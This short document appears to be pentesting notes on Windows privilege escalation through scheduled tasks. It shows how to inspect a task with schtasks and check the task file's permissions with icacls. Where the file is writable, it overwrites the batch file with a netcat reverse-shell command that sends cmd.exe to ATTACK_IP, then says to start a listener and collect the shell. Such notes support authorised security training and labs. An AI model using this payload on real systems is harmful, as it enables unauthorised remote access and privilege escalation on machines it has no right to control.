# Scheduled Tasks

## Example:

    Schtasks /query /tn vulntask /fo list /v

### Worth checking: Task to run, run as user.

    icacls c:\tasks\schtasks.bat (example)

#### Check file permissions on the executable. 

#### If our user has full access (f) or writing permissions, we insert the payload like:

    echo c:\tools\nc64.exe -e cmd.exe ATTACK_IP PORT > C:\tasks\schtasks.bat

### Start a listener, then you got yourself a shell!
